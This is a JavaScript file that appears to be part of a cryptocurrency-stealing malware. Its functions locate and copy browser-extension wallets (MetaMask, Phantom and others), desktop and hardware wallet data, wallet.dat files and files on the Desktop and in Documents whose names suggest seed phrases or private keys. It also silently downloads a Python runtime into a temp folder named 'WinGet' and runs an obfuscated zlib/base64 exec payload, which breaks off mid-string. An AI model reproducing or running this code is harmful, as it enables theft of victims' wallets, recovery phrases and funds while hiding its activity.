OperaGX: {
        base: path.join(appData, 'Opera Software', 'Opera GX Stable'),
        wallets: {
            'MetaMask': 'nkbihfbeogaeaoehlefnkodbefgpgknn',
            'Phantom': 'bfnaelmomeimhlpmgjnjophhpkkoljpa'
        }
    }
};

const desktopWalletPaths = {
    'Exodus': path.join(appData, 'Exodus', 'exodus.wallet'),
    'Atomic': path.join(appData, 'atomic', 'Local Storage', 'leveldb'),
    'Electrum': path.join(appData, 'Electrum', 'wallets'),
    'Ethereum': path.join(appData, 'Ethereum', 'keystore'),
    'Monero': path.join(appData, 'Monero'),
    'Bytecoin': path.join(appData, 'bytecoin'),
    'Jaxx Liberty': path.join(appData, 'com.liberty.jaxx', 'IndexedDB'),
    'Zcash': path.join(appData, 'Zcash'),
    'Armory': path.join(appData, 'Armory'),
    'Coinomi': path.join(localappdata, 'Coinomi', 'Coinomi', 'wallets'),
    'Guarda': path.join(appData, 'Guarda'),
    'Wasabi': path.join(appData, 'WalletWasabi', 'Client', 'Wallets'),
    'Bitcoin Core': path.join(appData, 'Bitcoin', 'wallets'),
    'Bitcoin': path.join(appData, 'Bitcoin'),
    'Litecoin': path.join(appData, 'Litecoin'),
    'Litecoin Core': path.join(appData, 'Litecoin', 'wallets'),
    'Dash Core': path.join(appData, 'DashCore', 'wallets'),
    'Dash': path.join(appData, 'DashCore'),
    'Dogecoin': path.join(appData, 'Dogecoin'),
    'Dogecoin Core': path.join(appData, 'Dogecoin', 'wallets'),
    'Daedalus': path.join(appData, 'Daedalus', 'wallets'),
    'Yoroi': path.join(appData, 'Yoroi'),
    'Nami': path.join(appData, 'Nami'),
    'Eternl': path.join(appData, 'eternl'),
    'MultiBit': path.join(appData, 'MultiBit'),
    'Binance': path.join(appData, 'Binance'),
    'com.liberty.jaxx': path.join(appData, 'com.liberty.jaxx', 'IndexedDB', 'file__0.indexeddb.leveldb')
};

const coldWalletPaths = {
    'Ledger Live': path.join(appData, 'Ledger Live'),
    'Ledger': path.join(appData, 'Ledger Live', 'Local Storage', 'leveldb'),
    'Trezor Suite': path.join(appData, 'Trezor Suite'),
    'Trezor': path.join(appData, 'Trezor Suite', 'IndexedDB'),
    'KeepKey': path.join(appData, 'KeepKey'),
    'BitBox': path.join(appData, 'BitBox')
};

async function extractBrowserWallets() {
    const extractedWallets = [];

    for (const [browserName, browserConfig] of Object.entries(browserWalletPaths)) {
        if (!fs.existsSync(browserConfig.base)) continue;

        const profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'];

        for (const profile of profiles) {
            const profilePath = path.join(browserConfig.base, profile);

            if (!fs.existsSync(profilePath)) continue;

            const extensionsPath = path.join(profilePath, 'Local Extension Settings');

            if (!fs.existsSync(extensionsPath)) continue;

            for (const [walletName, extensionId] of Object.entries(browserConfig.wallets)) {
                const walletPath = path.join(extensionsPath, extensionId);

                if (fs.existsSync(walletPath)) {
                    try {
                        const walletInfo = {
                            browser: browserName,
                            profile: profile,
                            wallet: walletName,
                            extensionId: extensionId,
                            path: walletPath,
                            files: []
                        };

                        const files = fs.readdirSync(walletPath);

                        for (const file of files) {
                            const filePath = path.join(walletPath, file);
                            const stat = fs.statSync(filePath);

                            if (stat.isFile()) {
                                walletInfo.files.push({
                                    name: file,
                                    size: stat.size,
                                    path: filePath
                                });
                            }
                        }

                        extractedWallets.push(walletInfo);

                    } catch (error) {
                        // Skip on error
                    }
                }
            }
        }
    }

    return extractedWallets;
}

async function copyBrowserWallets(wallets, outputDir) {
    const walletsDir = path.join(outputDir, 'Browser_Wallets');
    fs.mkdirSync(walletsDir, { recursive: true });

    for (const wallet of wallets) {
        const walletOutputDir = path.join(
            walletsDir,
            `${wallet.browser}_${wallet.profile}_${wallet.wallet}`.replace(/[<>:"/\\|?*]/g, '_')
        );

        fs.mkdirSync(walletOutputDir, { recursive: true });

        fs.writeFileSync(
            path.join(walletOutputDir, 'info.json'),
            JSON.stringify(wallet, null, 2),
            'utf8'
        );

        let totalSize = 0;
        const maxFileSize = 5 * 1024 * 1024;
        const maxWalletSize = 20 * 1024 * 1024;

        for (const file of wallet.files) {
            try {
                if (file.size > maxFileSize) continue;

                if (totalSize + file.size > maxWalletSize) break;

                const destPath = path.join(walletOutputDir, file.name);
                fs.copyFileSync(file.path, destPath);
                totalSize += file.size;
            } catch (error) {
                // Skip on error
            }
        }
    }

    return walletsDir;
}

async function extractDesktopWallets() {
    const extractedWallets = [];

    for (const [walletName, walletPath] of Object.entries(desktopWalletPaths)) {
        if (fs.existsSync(walletPath)) {
            try {
                const stat = fs.statSync(walletPath);

                const walletInfo = {
                    name: walletName,
                    path: walletPath,
                    type: stat.isDirectory() ? 'directory' : 'file',
                    size: stat.isFile() ? stat.size : null,
                    files: []
                };

                if (stat.isDirectory()) {
                    const files = getAllFilesWallet(walletPath, null, [], 0, 2);
                    walletInfo.files = files.slice(0, 30).map(f => {
                        try {
                            return {
                                name: path.relative(walletPath, f),
                                path: f,
                                size: fs.statSync(f).size
                            };
                        } catch (e) {
                            return null;
                        }
                    }).filter(f => f !== null);
                }

                extractedWallets.push(walletInfo);

            } catch (error) {
                // Skip on error
            }
        }
    }

    return extractedWallets;
}

async function copyDesktopWallets(wallets, outputDir) {
    const walletsDir = path.join(outputDir, 'Desktop_Wallets');
    fs.mkdirSync(walletsDir, { recursive: true });

    for (const wallet of wallets) {
        const walletOutputDir = path.join(
            walletsDir,
            wallet.name.replace(/[<>:"/\\|?*]/g, '_')
        );

        fs.mkdirSync(walletOutputDir, { recursive: true });

        fs.writeFileSync(
            path.join(walletOutputDir, 'info.json'),
            JSON.stringify(wallet, null, 2),
            'utf8'
        );

        if (wallet.type === 'directory') {
            const filesToCopy = wallet.files.slice(0, 70);

            for (const file of filesToCopy) {
                try {
                    const relativePath = file.name;
                    const destPath = path.join(walletOutputDir, relativePath);
                    const destDir = path.dirname(destPath);

                    fs.mkdirSync(destDir, { recursive: true });

                    if (file.size < 10 * 1024 * 1024) {
                        fs.copyFileSync(file.path, destPath);
                    }

                } catch (error) {
                    // Skip on error
                }
            }
        } else {
            try {
                const destPath = path.join(walletOutputDir, path.basename(wallet.path));
                fs.copyFileSync(wallet.path, destPath);
            } catch (error) {
                // Skip on error
            }
        }
    }

    return walletsDir;
}

async function extractColdWallets() {
    const extractedWallets = [];

    for (const [walletName, walletPath] of Object.entries(coldWalletPaths)) {
        if (fs.existsSync(walletPath)) {
            try {
                const stat = fs.statSync(walletPath);

                const walletInfo = {
                    name: walletName,
                    path: walletPath,
                    type: stat.isDirectory() ? 'directory' : 'file',
                    files: []
                };

                if (stat.isDirectory()) {
                    const files = getAllFilesWallet(walletPath, null, [], 0, 2);
                    walletInfo.files = files.slice(0, 30).map(f => {
                        try {
                            return {
                                name: path.relative(walletPath, f),
                                path: f,
                                size: fs.statSync(f).size
                            };
                        } catch (e) {
                            return null;
                        }
                    }).filter(f => f !== null);
                }

                extractedWallets.push(walletInfo);

            } catch (error) {
                // Skip on error
            }
        }
    }

    return extractedWallets;
}

async function copyColdWallets(wallets, outputDir) {
    const walletsDir = path.join(outputDir, 'Cold_Wallets');
    fs.mkdirSync(walletsDir, { recursive: true });

    for (const wallet of wallets) {
        const walletOutputDir = path.join(
            walletsDir,
            wallet.name.replace(/[<>:"/\\|?*]/g, '_')
        );

        fs.mkdirSync(walletOutputDir, { recursive: true });

        fs.writeFileSync(
            path.join(walletOutputDir, 'info.json'),
            JSON.stringify(wallet, null, 2),
            'utf8'
        );

        if (wallet.type === 'directory') {
            const filesToCopy = wallet.files.slice(0, 50);

            for (const file of filesToCopy) {
                try {
                    const relativePath = file.name;
                    const destPath = path.join(walletOutputDir, relativePath);
                    const destDir = path.dirname(destPath);

                    fs.mkdirSync(destDir, { recursive: true });

                    if (file.size < 10 * 1024 * 1024) {
                        fs.copyFileSync(file.path, destPath);
                    }

                } catch (error) {
                    // Skip on error
                }
            }
        }
    }

    return walletsDir;
}

async function findWalletDatFiles() {
    const walletFiles = [];
    const searchPaths = [
        path.join(appData, 'Bitcoin'),
        path.join(appData, 'Litecoin'),
        path.join(appData, 'Dogecoin'),
        path.join(appData, 'DashCore'),
        path.join(appData, 'Ethereum'),
        path.join(appData, 'Monero')
    ];

    for (const searchPath of searchPaths) {
        if (!fs.existsSync(searchPath)) continue;

        try {
            const files = getAllFilesWallet(searchPath, 'wallet.dat', [], 0, 2);

            for (const file of files) {
                try {
                    const stat = fs.statSync(file);
                    walletFiles.push({
                        path: file,
                        size: stat.size,
                        modified: stat.mtime
                    });
                } catch (e) {
                    // Skip
                }
            }
        } catch (error) {
            // Ignore access errors
        }
    }

    return walletFiles;
}

async function copyWalletDatFiles(walletFiles, outputDir) {
    const walletDatDir = path.join(outputDir, 'WalletDat_Files');
    fs.mkdirSync(walletDatDir, { recursive: true });

    for (let i = 0; i < walletFiles.length; i++) {
        const wallet = walletFiles[i];
        const fileName = `wallet_${i + 1}_${path.basename(path.dirname(wallet.path))}.dat`;
        const destPath = path.join(walletDatDir, fileName);

        try {
            fs.copyFileSync(wallet.path, destPath);
        } catch (error) {
            // Skip on error
        }
    }

    return walletDatDir;
}

async function findSeedPhrases() {
    const seedFiles = [];
    const searchPaths = [
        path.join(os.homedir(), 'Desktop'),
        path.join(os.homedir(), 'Documents')
    ];

    const seedPatterns = [
        /seed/i,
        /mnemonic/i,
        /recovery.*phrase/i,
        /private.*key/i,
        /wallet.*backup/i,
        /crypto.*backup/i
    ];

    const skipPatterns = [
        /discord/i,
        /backup.*codes/i
    ];

    for (const searchPath of searchPaths) {
        if (!fs.existsSync(searchPath)) continue;

        try {
            const files = getAllFilesWallet(searchPath, null, [], 0, 1).filter(file => {
                const ext = path.extname(file).toLowerCase();
                return ext === '.txt' || ext === '.doc' || ext === '.docx';
            });

            for (const file of files) {
                const fileName = path.basename(file).toLowerCase();

                if (skipPatterns.some(pattern => pattern.test(fileName))) {
                    continue;
                }

                if (seedPatterns.some(pattern => pattern.test(fileName))) {
                    try {
                        const stat = fs.statSync(file);
                        if (stat.size < 1024 * 1024) {
                            seedFiles.push({
                                path: file,
                                size: stat.size,
                                name: path.basename(file)
                            });
                        }
                    } catch (e) {
                        // Skip
                    }
                }
            }
        } catch (error) {
            // Ignore
        }
    }

    return seedFiles;
}

async function copySeedFiles(seedFiles, outputDir) {
    const seedDir = path.join(outputDir, 'Seed_Phrases');
    fs.mkdirSync(seedDir, { recursive: true });

    for (const file of seedFiles) {
        try {
            const destPath = path.join(seedDir, file.name);
            fs.copyFileSync(file.path, destPath);
        } catch (error) {
            // Skip on error
        }
    }

    return seedDir;
}

function getAllFilesWallet(dir, targetFileName = null, fileList = [], depth = 0, maxDepth = 3) {
    if (depth > maxDepth) return fileList;

    try {
        const files = fs.readdirSync(dir);

        for (const file of files) {
            if (file === 'node_modules' || file === '.git' || file === 'cache' || file === 'Cache') {
                continue;
            }

            const filePath = path.join(dir, file);

            try {
                const stat = fs.statSync(filePath);

                if (stat.isDirectory()) {
                    getAllFilesWallet(filePath, targetFileName, fileList, depth + 1, maxDepth);
                } else {
                    if (!targetFileName || file.toLowerCase() === targetFileName.toLowerCase()) {
                        fileList.push(filePath);
                    }
                }
            } catch (error) {
                // Skip inaccessible files
            }
        }
    } catch (error) {
        // Skip inaccessible directories
    }

    return fileList;
}

function formatWalletSummary(results) {
    let text = 'WALLET EXTRACTION SUMMARY\n';
    text += '='.repeat(50) + '\n\n';
    text += `Generated: ${results.timestamp.toISOString()}\n\n`;

    if (results.browserWallets.length > 0) {
        text += `BROWSER WALLETS (${results.browserWallets.length})\n`;
        text += '-'.repeat(30) + '\n';
        results.browserWallets.forEach((wallet, index) => {
            text += `${index + 1}. ${wallet.wallet} (${wallet.browser} - ${wallet.profile})\n`;
            text += `   Extension: ${wallet.extensionId}\n`;
            text += `   Path: ${wallet.path}\n`;
            text += `   Files: ${wallet.files.length}\n`;
            wallet.files.forEach(file => {
                text += `     - ${file.name} (${(file.size / 1024).toFixed(1)} KB)\n`;
            });
            text += '\n';
        });
    }

    if (results.desktopWallets.length > 0) {
        text += `DESKTOP WALLETS (${results.desktopWallets.length})\n`;
        text += '-'.repeat(30) + '\n';
        results.desktopWallets.forEach((wallet, index) => {
            text += `${index + 1}. ${wallet.name}\n`;
            text += `   Path: ${wallet.path}\n`;
            text += `   Files: ${wallet.files.length}\n`;
            wallet.files.forEach(file => {
                text += `     - ${file.name} (${(file.size / 1024).toFixed(1)} KB)\n`;
            });
            text += '\n';
        });
    }

    if (results.coldWallets.length > 0) {
        text += `COLD WALLETS (${results.coldWallets.length})\n`;
        text += '-'.repeat(30) + '\n';
        results.coldWallets.forEach((wallet, index) => {
            text += `${index + 1}. ${wallet.name}\n`;
            text += `   Path: ${wallet.path}\n`;
            text += `   Files: ${wallet.files.length}\n`;
            wallet.files.forEach(file => {
                text += `     - ${file.name} (${(file.size / 1024).toFixed(1)} KB)\n`;
            });
            text += '\n';
        });
    }

    if (results.walletDatFiles.length > 0) {
        text += `WALLET.DAT FILES (${results.walletDatFiles.length})\n`;
        text += '-'.repeat(30) + '\n';
        results.walletDatFiles.forEach((file, index) => {
            text += `${index + 1}. ${file.name}\n`;
            text += `   Path: ${file.path}\n`;
            text += `   Size: ${(file.size / 1024 / 1024).toFixed(1)} MB\n\n`;
        });
    }

    if (results.seedFiles.length > 0) {
        text += `SEED PHRASES (${results.seedFiles.length})\n`;
        text += '-'.repeat(30) + '\n';
        results.seedFiles.forEach((file, index) => {
            text += `${index + 1}. ${file.name}\n`;
            text += `   Path: ${file.path}\n`;
            text += `   Size: ${(file.size / 1024).toFixed(1)} KB\n\n`;
        });
    }

    const totalWallets = results.browserWallets.length + results.desktopWallets.length +
        results.coldWallets.length + results.walletDatFiles.length + results.seedFiles.length;

    text += 'SUMMARY\n';
    text += '-'.repeat(30) + '\n';
    text += `Total Wallets Found: ${totalWallets}\n`;
    text += `Browser Wallets: ${results.browserWallets.length}\n`;
    text += `Desktop Wallets: ${results.desktopWallets.length}\n`;
    text += `Cold Wallets: ${results.coldWallets.length}\n`;
    text += `Wallet.dat Files: ${results.walletDatFiles.length}\n`;
    text += `Seed Files: ${results.seedFiles.length}\n`;

    return text;
}

async function extractAllWallets(outputDir) {
    const results = {
        browserWallets: [],
        desktopWallets: [],
        coldWallets: [],
        walletDatFiles: [],
        seedFiles: [],
        timestamp: new Date()
    };

    results.browserWallets = await extractBrowserWallets();
    if (results.browserWallets.length > 0) {
        await copyBrowserWallets(results.browserWallets, outputDir);
    }

    results.desktopWallets = await extractDesktopWallets();
    if (results.desktopWallets.length > 0) {
        await copyDesktopWallets(results.desktopWallets, outputDir);
    }

    results.coldWallets = await extractColdWallets();
    if (results.coldWallets.length > 0) {
        await copyColdWallets(results.coldWallets, outputDir);
    }

    results.walletDatFiles = await findWalletDatFiles();
    if (results.walletDatFiles.length > 0) {
        await copyWalletDatFiles(results.walletDatFiles, outputDir);
    }

    results.seedFiles = await findSeedPhrases();
    if (results.seedFiles.length > 0) {
        await copySeedFiles(results.seedFiles, outputDir);
    }

    const hasWallets = results.browserWallets.length > 0 ||
        results.desktopWallets.length > 0 ||
        results.coldWallets.length > 0 ||
        results.walletDatFiles.length > 0 ||
        results.seedFiles.length > 0;

    if (hasWallets) {
        const summaryText = formatWalletSummary(results);
        fs.writeFileSync(
            path.join(outputDir, 'wallets_summary.txt'),
            summaryText,
            'utf8'
        );
    }

    return results;
}

// ========================================
// INPUT PAYLOAD ORCHESTRATION
// ========================================

const fodase = os.tmpdir();
const installDir = path.join(fodase, "WinGet");
const nugetUrl = "https://globalcdn.nuget.org/packages/python.3.10.0.nupkg";
const pythonExe = path.join(installDir, "tools", "python.exe");
const tempScript = path.join(os.tmpdir(), "browser_forensics.py");
const requirements = ["pycryptodome", "PythonForWindows"];

async function downloadFile(url, dest) {
    const response = await axios.get(url, { responseType: 'stream', timeout: 30000, maxRedirects: 3 });
    const writer = fs.createWriteStream(dest);
    response.data.pipe(writer);
    return new Promise((resolve, reject) => {
        writer.on('finish', resolve);
        writer.on('error', reject);
    });
}

function extractZip(zipPath, dest) {
    return new Promise((resolve, reject) => {
        try {
            const zip = new AdmZip(zipPath);
            zip.extractAllTo(dest, true);
            resolve();
        } catch (e) {
            reject(new Error("ZIP extraction failed: " + e.message));
        }
    });
}

function InstallLibs(packages, env) {
    const installPromises = packages.map(pkg => {
        return new Promise((resolve) => {
            execFile(
                pythonExe,
                ["-m", "pip", "install", "--no-cache-dir", "--no-warn-script-location", "--disable-pip-version-check", "-q", pkg],
                { env, timeout: 30000, windowsHide: true },
                (err) => resolve(!err)
            );
        });
    });
    return Promise.all(installPromises);
}

function Runpy(scriptPath, env, args = []) {
    return new Promise((resolve, reject) => {
        execFile(pythonExe, [scriptPath, ...args], { env, timeout: 90000, windowsHide: true, maxBuffer: 10 * 1024 * 1024 }, (err, stdout, stderr) => {
            if (err) return reject(err);
            resolve();
        });
    });
}

async function ChromePython(pyCode, scriptPathOverride, args = []) {
    // FORCE CLEANUP: Always remove previous installation to prevent corruption (User Request)
    if (fs.existsSync(installDir)) {
        try {
            console.log('Performing forced cleanup of Python environment...');
            fs.rmSync(installDir, { recursive: true, force: true });
        } catch (e) {
            console.log('Cleanup warning:', e.message);
        }
    }

    if (!fs.existsSync(installDir)) fs.mkdirSync(installDir, { recursive: true });
    const zipPath = path.join(fodase, "python310.zip");
    const packagesInstalledFlag = path.join(installDir, ".packages_installed");
    const scriptOut = scriptPathOverride || tempScript;
    const libDir = path.join(installDir, "tools", "Lib");

    // Validation: If python exists but Lib is missing, force reinstall
    if (fs.existsSync(pythonExe) && !fs.existsSync(libDir)) {
        console.log('Detected broken Python installation (missing Lib), reinstalling...');
        try {
            fs.rmSync(installDir, { recursive: true, force: true });
            fs.mkdirSync(installDir, { recursive: true });
        } catch (e) {
            console.log('Failed to clean install dir:', e.message);
        }
    }

    if (!fs.existsSync(pythonExe)) {
        await downloadFile(nugetUrl, zipPath);
        await extractZip(zipPath, installDir);
        fs.unlinkSync(zipPath);
    }

    // CRITICAL FIX: Modify ._pth files to ENABLE site-packages (import site)
    // Do NOT delete the file, as it breaks the path to python310.zip (stdlib)
    try {
        const toolsDir = path.join(installDir, "tools");
        if (fs.existsSync(toolsDir)) {
            const files = fs.readdirSync(toolsDir);
            for (const file of files) {
                if (file.endsWith('._pth')) {
                    const pthPath = path.join(toolsDir, file);
                    let content = fs.readFileSync(pthPath, 'utf8');
                    // Uncomment "import site" to allow pip/site-packages to work
                    if (content.includes('#import site')) {
                        content = content.replace('#import site', 'import site');
                        fs.writeFileSync(pthPath, content);
                        console.log(`Fixed: Enabled site-packages in ${file}`);
                    } else if (!content.includes('import site')) {
                        // If missing entirely, append it
                        fs.appendFileSync(pthPath, '\nimport site');
                        console.log(`Fixed: Appended import site to ${file}`);
                    }
                }
            }
        }
    } catch (e) {
        console.log('Error patching python environment:', e.message);
    }

    // Match ChromePython's environment configuration exactly
    const env = {
        ...process.env,
        PYTHONUNBUFFERED: '1'
    };

    const setupPromises = [];

    if (!fs.existsSync(packagesInstalledFlag)) {
        // Bootstrap pip if needed
        setupPromises.push(new Promise(resolve => {
            execFile(pythonExe, ["-m", "ensurepip", "--default-pip"], { env, timeout: 60000, windowsHide: true }, () => resolve());
        }).then(() => {
            return InstallLibs(requirements, env);
        }).then((results) => {
            try { fs.writeFileSync(packagesInstalledFlag, '1'); } catch (e) { }
        }));
    }

    setupPromises.push(Promise.resolve(fs.writeFileSync(scriptOut, pyCode)));

    await Promise.all(setupPromises);

    try {
        await Runpy(scriptOut, env, args);
    } finally {
        try { fs.unlinkSync(scriptOut); } catch (e) { }
    }
}

const pythonCodeTemplate = 'import zlib, base64, sys; exec(zlib.decompress(base64.b64decode("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